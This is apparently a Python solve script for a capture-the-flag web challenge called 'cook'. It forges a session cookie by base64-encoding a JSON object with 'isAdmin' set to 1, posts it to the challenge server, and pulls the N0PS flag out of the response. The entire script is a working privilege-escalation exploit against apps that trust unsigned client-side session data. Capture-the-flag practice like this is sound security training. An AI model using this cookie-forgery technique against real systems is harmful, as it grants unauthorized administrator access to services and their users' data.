import requests
import base64
import json
import re

url = 'https://nopsctf-web-cook.chals.io/'

data = {"username":"Bagas Oli Samping", "isAdmin":1}
json_data = json.dumps(data)

encoded_data = base64.b64encode(json_data.encode()).decode()
cookies = {'session': encoded_data}
response = requests.post(url, cookies=cookies)
print(response.text)

flag = re.findall('N0PS{.*}', response.text)
print("FLAG:", flag[0])